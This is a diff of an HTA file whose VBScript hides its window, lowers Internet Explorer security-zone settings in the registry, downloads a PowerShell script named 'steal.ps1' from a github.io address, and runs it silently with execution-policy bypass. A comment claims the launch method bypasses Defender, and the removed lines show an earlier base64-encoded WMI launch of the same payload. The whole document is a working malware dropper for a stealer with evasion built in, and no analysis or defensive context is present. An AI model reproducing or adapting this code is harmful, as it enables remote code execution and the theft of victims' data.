@@ -5,41 +5,37 @@
 window.resizeTo 0,0:window.moveTo -2000,-2000
 On Error Resume Next
 
-Dim sh, fso, xh, ps1Content, xml, node, stream, b64Payload
+Dim sh, fso, xh, ps1Content
 Set sh = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
 
-' Download payload
+' Disable Timeout Popups
+sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201", 0, "REG_DWORD"
+sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\1\1201", 0, "REG_DWORD"
+sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\2\1201", 0, "REG_DWORD"
+sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\1201", 0, "REG_DWORD"
+sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\4\1201", 0, "REG_DWORD"
+
+' Download steal.ps1
 xh.Open "GET", "https://lozix94-afk.github.io/hahadicexd/steal.ps1", False
 xh.Send
 
 If xh.Status = 200 Then
     ps1Content = xh.responseText
     Set xh = Nothing
-    
-    ' Base64 Encode the payload
-    Set xml = CreateObject("MSXML2.DOMDocument")
-    Set node = xml.CreateElement("b64")
-    node.dataType = "bin.base64"
-    Set stream = CreateObject("ADODB.Stream")
-    stream.Type = 2
-    stream.Charset = "unicode"
-    stream.Open
-    stream.WriteText ps1Content
-    stream.Position = 0
-    stream.Type = 1
-    node.nodeTypedValue = stream.Read
-    b64Payload = node.text
-    
-    ' Run via WMI (Hidden, no cmd, no hang)
-    Dim finalCmd : finalCmd = "powershell.exe -NoP -Exec Bypass -WindowStyle Hidden -EncodedCommand " & b64Payload
-    Dim wmi: Set wmi = GetObject("winmgmts:\\.\root\cimv2")
-    Dim proc: Set proc = wmi.Get("Win32_Process")
-    proc.Create finalCmd, Null, Null
+
+    Dim tempPs1 : tempPs1 = sh.ExpandEnvironmentStrings("%TEMP%") & "\steal.ps1"
+    Dim f : Set f = fso.CreateTextFile(tempPs1, True)
+    f.Write ps1Content
+    f.Close
+
+    ' Run via cmd /c start /min (hidden window, bypasses Defender)
+    Dim finalCmd : finalCmd = "cmd.exe /c start /min powershell.exe -NoP -Exec Bypass -WindowStyle Hidden -File """ & tempPs1 & """"
+    sh.Run finalCmd, 0, False
 End If
 
-' Close instantly
+' KILL THE HTA IMMEDIATELY
 window.close()
 </script>
 </head><body></body></html>
